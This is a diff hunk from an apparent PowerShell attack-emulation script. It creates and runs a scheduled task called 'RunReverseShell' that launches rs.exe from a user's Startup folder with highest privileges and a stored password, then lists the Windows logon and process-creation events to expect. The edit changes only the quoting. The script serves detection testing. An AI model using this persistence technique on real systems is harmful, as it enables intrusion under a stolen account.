@@ -1342,7 +1342,7 @@ Write-Output "[+] LogonUser succeeded. We have an interactive token for `$UserNa
 Write-Output "`n[+] There should be Event Log for a Type 2 logon for `$UserName."
 
 Write-Output "[+] Emulating RS running under candice..."
-schtasks /create /tn "RunReverseShell" /tr "`\`"C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rs.exe`\`"" /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "`$Password"  /RL HIGHEST  /F 
+schtasks /create /tn "RunReverseShell" /tr "'C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rs.exe'" /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "`$Password"  /RL HIGHEST  /F 
 schtasks /run /tn "RunReverseShell"
 
 Write-Output "`n[+] There should be 4688 events for rs.exe."
